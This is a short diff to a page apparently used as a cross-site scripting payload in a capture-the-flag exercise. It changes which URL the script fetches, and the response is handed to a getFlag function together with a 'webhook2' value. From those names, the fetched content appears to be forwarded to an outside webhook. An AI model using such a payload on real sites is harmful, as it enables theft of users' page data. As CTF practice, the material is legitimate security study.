@@ -38,7 +38,7 @@ layout: xss
     /*let options = {
         mode: 'no-cors' // 'cors' by default
     };*/
-    fetch(url)
+    fetch(jsonProvaUrl)
         .then(res => { console.log(res); return res.text(); })
         .then(text => { console.log(text); getFlag(webhook2, text) })
 </script>
